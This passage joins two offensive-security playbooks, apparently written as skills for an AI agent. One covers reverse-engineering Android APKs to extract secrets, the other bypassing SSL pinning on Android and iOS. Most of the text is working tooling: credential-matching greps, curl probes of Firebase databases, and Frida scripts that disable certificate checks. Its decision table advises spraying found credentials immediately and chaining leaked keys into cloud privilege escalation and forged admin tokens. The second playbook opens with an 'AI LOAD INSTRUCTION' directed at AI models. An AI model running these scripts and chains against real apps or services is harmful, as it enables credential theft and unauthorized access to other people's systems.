  mkdir -p "extracted_<package>/$(basename "$inner" .apk)"
  unzip -o "$inner" -d "extracted_<package>/$(basename "$inner" .apk)"
done
```

---

## Stage 2 — DEX decompilation (jadx)

```bash
# Install
brew install jadx          # macOS
# or
wget https://github.com/skylot/jadx/releases/latest/download/jadx-1.5.x.zip

# Decompile
jadx -d decompiled_<package>/ <package>.apk

# For XAPK that contains multiple APKs
for inner in extracted_<package>/*.apk; do
  jadx -d decompiled_<package>_$(basename "$inner" .apk)/ "$inner"
done
```

For a fast "strings only" pass without full decompilation:
```bash
find extracted_<package> -name "classes*.dex" -exec strings -8 {} \; > strings_<package>.txt
```

---

## Stage 3 — Secret grep (the 60-pattern catalog)

```bash
# URL grep — owned-domain references
grep -oE 'https?://[a-zA-Z0-9.-]+\.(target1|target2|target3)\.(com|io|net|in)[a-zA-Z0-9./_?=&%-]*' strings_<package>.txt | sort -u

# Internal IP / port URLs
grep -oE 'https?://(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.)[0-9.]+(:[0-9]+)?[a-zA-Z0-9./_?=&-]*' strings_<package>.txt

# Cloud credentials
grep -oE 'AKIA[A-Z0-9]{16}'                            # AWS Access Key
grep -oE 'aws_secret_access_key[\s:=]+[A-Za-z0-9/+=]{40}' # AWS Secret
grep -oE 'AIza[A-Za-z0-9_-]{35}'                       # Google API key
grep -oE 'ya29\.[A-Za-z0-9_-]+'                        # Google OAuth refresh token
grep -oE 'gh[ps]_[A-Za-z0-9]{36}'                      # GitHub PAT
grep -oE 'glpat-[A-Za-z0-9_-]{20}'                     # GitLab PAT
grep -oE 'xox[pbar]-[A-Za-z0-9-]+'                     # Slack token
grep -oE 'sk-[A-Za-z0-9]{48}'                          # OpenAI API key
grep -oE 'sk-ant-[A-Za-z0-9_-]{90,}'                   # Anthropic API key
grep -oE 'AC[a-f0-9]{32}'                              # Twilio Account SID
grep -oE 'sk_live_[A-Za-z0-9]{24}'                     # Stripe live key
grep -oE 'pk_live_[A-Za-z0-9]{24}'                     # Stripe publishable
grep -oE 'mailgun-[A-Za-z0-9-]{40}'                    # Mailgun
grep -oE 'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}'    # SendGrid

# JWT (any algorithm)
grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' strings_<package>.txt

# Firebase
grep -oE '"(api_key|project_id|database_url|storage_bucket|client_id|mobilesdk_app_id|google_app_id|gcm_defaultSenderId)"\s*:\s*"[^"]+"' \
  extracted_<package>/res/values/strings.xml \
  extracted_<package>/google-services.json \
  decompiled_<package>/resources/AndroidManifest.xml 2>/dev/null

# OAuth client secrets
grep -oE 'client_secret["\s:=]+[A-Za-z0-9_-]{24,}' strings_<package>.txt

# Hardcoded passwords (heuristic — many false positives, manual review)
grep -oE '"password"\s*:\s*"[^"]+"|password\s*=\s*"[^"]+"' decompiled_<package>/sources/**/*.java 2>/dev/null
```

### Real-world example finding (anonymized — from an authorized engagement)
```
# Customer-facing APK shipped a hardcoded URL of this shape:
https://api.<client>.example/<path-token>/<resource-token>?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<payload>.<sig>

# Decoded JWT payload: {"sid":<int>,"iat":<unix-ts>,"exp":<unix-ts>}
# Expired ~8 years earlier — but path tokens + 30 /v1/* endpoints still useful intel
```

---

## Stage 4 — Pinned certificate extraction

```bash
# Find .cer / .der / .pem files in assets/
find extracted_<package>/assets -iname "*.cer" -o -iname "*.der" -o -iname "*.pem" -o -iname "*.crt" 2>/dev/null

# Or in network_security_config.xml
find extracted_<package> -name "network_security_config.xml" -exec cat {} \;

# For each cert, extract subject + SAN (might reveal new internal API hosts)
for cert in $(find extracted_<package>/assets -iname "*.cer"); do
  echo "=== $cert ==="
  openssl x509 -in "$cert" -noout -subject -issuer -dates 2>/dev/null
  openssl x509 -in "$cert" -noout -text 2>/dev/null | grep -E 'Subject:|DNS:|Issuer:|Validity'
done
```

### Real-world example
A customer-facing APK from an authorized engagement contained `assets/api_<service>_<domain>_com.cer` — revealed the existence of an `api.<service>.<domain>.example` asset that had NOT surfaced in passive recon.

---

## Stage 5 — Exported component enumeration

AndroidManifest.xml lists components. Exported ones (especially with `android:exported="true"` or implicit-export via intent-filter) can be triggered by other apps — potential intent-injection attack surface.

```bash
# Decode binary AndroidManifest if needed
apktool d <package>.apk -o decoded_<package>/    # apktool decodes binary manifest

# Or read directly from jadx output
cat decompiled_<package>/resources/AndroidManifest.xml | grep -E '<(activity|service|receiver|provider)' | head -50

# Filter exported
grep -E 'android:exported="true"' decompiled_<package>/resources/AndroidManifest.xml
```

For each exported component, check:
- Does it accept extras that flow into a WebView (intent → WebView → XSS / file://)
- Does it accept URI extras (potential SSRF via deep link)
- Does it pass extras to other Activities (intent redirection)

---

## Stage 6 — Firebase / cloud-service config inspection

```bash
# google-services.json — full Firebase config
find extracted_<package> -name "google-services.json" -exec cat {} \; | python3 -m json.tool

# Look for:
#   project_id   → can guess Firestore / RTDB URL: https://<project_id>.firebaseio.com/.json
#   storage_bucket → can guess GCS bucket: gs://<bucket>
#   web_api_key  → can use to enumerate Firebase tenant config

# Test if Firestore is publicly readable
curl -s "https://firestore.googleapis.com/v1/projects/<project_id>/databases/(default)/documents/users"

# Test if Realtime DB is publicly readable
curl -s "https://<project_id>.firebaseio.com/.json"

# Test if Storage Bucket is publicly listable
curl -s "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
```

---

## Stage 7 — Runtime instrumentation (Frida)

For when static analysis isn't enough — you want to dump tokens at runtime, bypass cert pinning, or trace API calls.

### Setup
```bash
pip install --break-system-packages frida-tools objection
adb devices  # ensure device/emulator connected
# Push frida-server to device (root required, or use rooted emulator like Genymotion / x86_64 AVD)
```

### Cert-pinning bypass (universal)
```javascript
// frida-script-pinning-bypass.js
Java.perform(function() {
    // OkHttp
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
            console.log('[+] OkHttp pinning bypassed for: ' + arguments[0]);
            return;
        };
    } catch (e) {}
    // HttpsURLConnection
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function(chain) {
            console.log('[+] TrustManagerImpl verifyChain bypassed');
            return chain;
        };
    } catch (e) {}
});
```
```bash
frida -U -l frida-script-pinning-bypass.js -f <package_id> --no-pause
```

### Hook HTTP requests
```javascript
Java.perform(function() {
    var OkHttpClient = Java.use('okhttp3.OkHttpClient');
    var Request = Java.use('okhttp3.Request');
    var Call = Java.use('okhttp3.Call');
    
    OkHttpClient.newCall.implementation = function(req) {
        var url = req.url().toString();
        var headers = req.headers().toString();
        console.log('[REQ] ' + url);
        console.log('[HDRS] ' + headers);
        return this.newCall(req);
    };
});
```

### Quick token extraction via objection
```bash
objection --gadget com.target.app explore
# Inside:
android hooking watch class_method <class>.<method> --dump-args --dump-return
```

---

## Stage 8 — Network traffic capture (via mitmproxy)

For deeper API discovery once pinning is bypassed.

```bash
# Run mitmproxy on host
mitmproxy --listen-port 8080

# Configure Android device proxy to host:8080
# Install mitmproxy CA cert on device:
#   - Pull from http://mitm.it on the device, or
#   - Push to /system/etc/security/cacerts/ on rooted device

# Use the Frida pinning bypass script while traffic flows through mitmproxy
# All API calls visible in mitmproxy UI
```

---

## Decision tree — what to do with what you find

| Finding | Next move |
|---|---|
| Active JWT (not expired) | Test against the API host — does it grant access? Try sid manipulation |
| Expired JWT | Inspect path tokens / API endpoint structure — useful intel for post-VPN |
| AWS access key | Use `awscli` to test: `aws sts get-caller-identity` — many leaked keys still have permissions |
| Firebase project_id + web_api_key | Test public Firestore/RTDB/Storage read |
| Google API key (AIza*) | Test against `https://www.googleapis.com/customsearch/v1` etc. — see what API the key activates |
| Hardcoded HTTP URLs (http://) | Possible MITM via downgrade if cert pinning is missing |
| Pinned cert for internal host | New asset discovery — that host is real |
| Exported Activity with WebView | Test intent-injection → URL-loading abuse |
| Stack-trace artifacts (Stack Overflow URLs) | Identify the developer's questions → infer architecture |
| Hardcoded credentials | Spray immediately (respect any caps from related skills) |

---

## Anti-patterns

- **Don't grep only for "password"** — most secrets have specific high-signal patterns (AKIA, AIza, eyJ, etc.). Generic word grep produces too much noise.
- **Don't skip XAPK split APKs** — config.armeabi splits and config.<lang> splits sometimes contain different code paths.
- **Don't trust expired JWTs as "dead intel"** — the path structure, endpoint list, and signing algorithm are still useful. The 8-year-expired-JWT example above shows this.
- **Don't reverse only the latest version** — older APK versions (via APKMirror version history) sometimes have secrets removed in newer versions but still active server-side.
- **Don't ignore Firebase even if app looks "simple"** — Firebase rules misconfigurations (public read on Firestore) are extremely common.
- **Don't run Frida on a production device** — use rooted emulator or test device only.

---

## Tooling install (one-time)

```bash
brew install jadx p7zip
pip install --break-system-packages frida-tools objection
# Genymotion or AVD for rooted Android emulator
```

For APK download convenience, can add a `download-apk` shell function:
```bash
download-apk() {
  local pkg="$1"
  curl -sk -L --max-time 60 "https://d.apkpure.net/b/APK/$pkg?version=latest" -o "$pkg.apk"
  echo "Downloaded $(wc -c < "$pkg.apk") bytes"
  file "$pkg.apk"
}
```

---

## Bridge to neighboring skills

- `offensive-osint` — Play Store / APKMirror enum is part of broader OSINT
- `hunt-cloud-misconfig` — Firebase public-read is exactly this skill's specialty post-discovery
- `hunt-api-misconfig` — JWT manipulation once you have the algorithm + sample token
- `evidence-hygiene` — extracted secrets need redaction before report inclusion
- `redteam-mindset` — APK reverse on day-1 of an engagement, not as an afterthought

---

## Real-world finding template (anonymized — authorized engagement)

**Finding: Hardcoded JWT + 30+ Internal API Endpoints in a customer-facing APK**

- Subject: Hardcoded artifacts in legacy mobile build reveal internal API surface
- Observations: Decompilation of `com.<client>.<app>` revealed embedded JWT (expired ~8 years earlier) and 30+ `/v1/*` endpoint paths against `api2.<client>.example` (internal-only externally)
- Description: APK ships with developer build artifacts. Path tokens are security-by-obscurity; API endpoint inventory is reconnaissance-grade.
- Impact: Post-VPN-foothold (via cred compromise), attacker has full API surface map without binary reverse. HS256 secret recovery (via SSRF/LFI) would yield arbitrary token forging.
- Recommendation: rotate HS256 secret, migrate to RS256, remove hardcoded URLs from builds, audit all org APKs.
- Evidence: extracted strings, decoded JWT, endpoint inventory

---

## Related Skills & Chains

- **`cloud-iam-deep`** — APK secret extraction frequently yields live AWS/GCP/Azure credentials. Chain primitive: jadx string-grep produces AWS Access Key ID + Secret → `cloud-iam-deep` `aws sts get-caller-identity` → role/policy enumeration → IAM privilege-escalation path (one of 24 documented AWS escalation patterns) → cloud-plane takeover. Same flow applies to GCP service-account JSON and Azure shared-access-signature tokens extracted from APK resources.
- **`hunt-api-misconfig`** — APK endpoint inventory hands you the API surface for free; mass-assignment, JWT, and CORS bugs are typical. Chain primitive: APK reveals `/v1/users/me` and `/v1/admin/users` → `hunt-api-misconfig` mass-assignment probes (`{is_admin:true}`) against `/v1/users/me` → admin role escalation → access to `/v1/admin/users`.
- **`hunt-rce`** — Hardcoded JWT signing secrets (HS256) extracted from APK enable arbitrary token forging. Chain primitive: APK strings yield HS256 secret → forge admin token → access admin API → if API has eval/template/sink → `hunt-rce` to server. Also: exported components with intent-injection sinks can reach `Runtime.exec` if app is local-installed.
- **`offensive-osint`** — APK is one node in the broader org recon graph; pair with breach corpora and cert transparency. Chain primitive: APK reveals internal API hostname `api2.example.com` → `offensive-osint` certificate-transparency lookup → discover sibling subdomains → expanded attack surface.
- **`redteam-report-template`** — APK findings need clear "what the binary leaks" framing because client engineers often dismiss mobile-static findings as "obfuscation problem." Chain primitive: validated finding (token/URL/secret extracted) → `triage-validation` 7-Question Gate (specifically: "does this credential still authenticate today?") → `redteam-report-template` packaging with explicit binary version + extraction reproduction steps.



---

## mobile-ssl-pinning-bypass

# SKILL: Mobile SSL Pinning Bypass — Expert Playbook

> **AI LOAD INSTRUCTION**: SSL pinning prevents MITM proxying of mobile app traffic. Covers all major bypass techniques: Frida hooks for Android (OkHttp, TrustManager, Conscrypt) and iOS (NSURLSession, AFNetworking, TrustKit), Objection automated bypass, manual APK smali patching, and rooted device certificate trust. Base models often suggest only Objection without covering manual approaches for hardened apps.

## 0. RELATED ROUTING

- android-pentesting — broad Android pentest methodology
- ios-pentesting-tricks — iOS runtime manipulation

---

## 1. ANDROID SSL PINNING BYPASS

### Method 1: Objection (Automated, Frida-based)

```bash
# Install objection:
pip3 install objection

# Start the app, then:
objection -g com.target.app explore

# In objection prompt:
android sslpinning disable

# Or with Frida directly:
frida -U -f com.target.app --no-pause -l ssl_bypass.js
```

### Method 2: Frida Script — Universal SSL Bypass

```javascript
// ssl_bypass.js — covers OkHttp3, TrustManager, Conscrypt, Appcelerator
Java.perform(function() {
    // Bypass TrustManager
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    
    var TrustManager = Java.registerClass({
        name: 'com.sslpinning.UnSafeHostnameVerifier',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    var TrustManagers = [TrustManager.$new()];
    var SSLContextInstance = SSLContext.getInstance('TLS');
    SSLContextInstance.init(null, TrustManagers, null);
    
    // Override getDefault
    SSLContext.getDefault.implementation = function() {
        return SSLContextInstance;
    };
});
```

### Method 3: Frida Script — OkHttp3 Specific

```javascript
Java.perform(function() {
    // OkHttp3 CertificatePinner bypass
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
            console.log("Bypassed OkHttp3 CertificatePinner for: " + hostname);
            return;
        };
        CertificatePinner.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function(hostname, certs) {
            return;
        };
    } catch(e) {
        console.log("OkHttp3 CertificatePinner not found: " + e);
    }
    
    // TrustKit (Android) bypass
    try {
        var TrustManagerBuilder = Java.use('com.datatheorem.android.trustkit.pinning.OkHostnameVerifier');
        TrustManagerBuilder.verify.overload('java.lang.String', 'javax.net.ssl.SSLSession').implementation = function(host, session) {
            return true;
        };
    } catch(e) {}
});
```

### Method 4: APK Patching (No Root)

```bash
# 1. Decompile APK
apktool d target.apk -o decompiled/

# 2. Find network security config or pinning code:
grep -r "CertificatePinner\|pin\|certificate" decompiled/smali/

# 3. Add network_security_config.xml to allow user certs:
# res/xml/network_security_config.xml:
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config>
        <trust-anchors>
            <certificates src="system"/>
            <certificates src="user"/>
        </trust-anchors>
    </base-config>
    <debug-overrides>
        <trust-anchors>
            <certificates src="user"/>
        </trust-anchors>
    </debug-overrides>
</network-security-config>

# 4. Add to AndroidManifest.xml:
# android:networkSecurityConfig="@xml/network_security_config"

# 5. Recompile and sign:
apktool b decompiled/ -o patched.apk
# Sign with uber-apk-signer:
java -jar uber-apk-signer.jar -a patched.apk
```

### Method 5: Magisk Module (Rooted)

```bash
# MagiskTrustUserCerts module:
# Install via Magisk Manager → adds user certs to system trust store
# This makes Burp's certificate trusted without patching
```

---

## 2. IOS SSL PINNING BYPASS

### Method 1: Objection (Automated)

```bash
# Attach to running iOS app:
objection -g "com.target.App" explore

# In objection:
ios sslpinning disable
```

### Method 2: Frida Script — iOS

```javascript
// iOS SSL bypass
var TrustResultTypeProceed = 1;

Interceptor.attach(Module.findExportByName("Security", "SecTrustEvaluate"), {
    onLeave: function(retval) {
        retval.replace(0); // errSecSuccess
    }
});

// NSURLSession delegate bypass
var NSURLSession = ObjC.classes.NSURLSession;
// Override URLSession:didReceiveChallenge:completionHandler: to accept all certs
var hook = ObjC.classes.NSObject['- URLSession:didReceiveChallenge:completionHandler:'];
// Swizzle to call completion with NSURLSessionAuthChallengeUseCredential
```

### Method 3: SSL Kill Switch 2 (Cydia/jailbreak)

```
Install via Cydia: SSL Kill Switch 2
Toggle "Disable Certificate Validation" in Settings
Works for NSURLSession, NSURLConnection, AFNetworking
```

### Method 4: Burp Certificate Install (iOS)

```bash
# 1. Configure proxy in device WiFi settings
# 2. Visit http://burpsuite in Safari
# 3. Download Burp certificate
# 4. Settings → Profile Downloaded → Install
# 5. Settings → General → About → Certificate Trust Settings → Enable for Burp
```

---

## 3. PROXY SETUP

### Android ProxyDroid

```bash
# For non-proxy-aware apps (requires root):
# Install ProxyDroid from Magisk or repo
# Set global proxy to Burp IP:8080

# Alternative: adb port forwarding
adb reverse tcp:8080 tcp:8080
# Then set proxy to 127.0.0.1:8080 in WiFi settings
```

### Android Global Proxy (adb)

```bash
# Set proxy:
adb shell settings put global http_proxy ATTACKER_IP:8080

# Remove proxy:
adb shell settings put global http_proxy :0
```

---

## 4. TESTING HARDENED PINNING

### Detect Pinning Implementation

```bash
# Check for common pinning libraries in APK:
unzip -o target.apk -d extracted/
grep -r "okhttp3\|TrustKit\|Picasso\|Volley\|OkHttp\|certificate.pem" extracted/

# Check assets for bundled certificates:
find extracted/assets -name "*.pem" -o -name "*.der" -o -name "*.crt"
```

### Custom Pinning — Manual Smali Patch

If the app implements custom pinning in Smali:

```smali
# Original code that checks certificate hash:
invoke-virtual {v0}, Ljava/security/cert/Certificate;->getEncoded()[B
# ... hash comparison logic ...
# Patch to skip comparison (always return true/success)
```

---

## 5. QUICK DECISION TREE

```
SSL pinning blocking proxy?
├── Android?
│   ├── Rooted device?
│   │   ├── Objection → android sslpinning disable (fastest)
│   │   ├── Frida manual script for specific library
│   │   └── MagiskTrustUserCerts module
│   └── Non-rooted device?
│       ├── APK patching → repack with network_security_config
│       └── Virtual device (emulator with root)
│
└── iOS?
    ├── Jailbroken?
    │   ├── Objection → ios sslpinning disable
    │   └── SSL Kill Switch 2 (Cydia)
    └── Non-jailbroken?
        ├── Install Burp CA via profile (sometimes sufficient)
        └── Resigned IPA with pinning code patched

Still blocked after bypass?
├── App may verify HPKP or use custom TLS stack
├── Inspect traffic in Wireshark to understand protocol
├── Use Frida to hook the specific method directly
└── Check for certificate transparency log matching
```


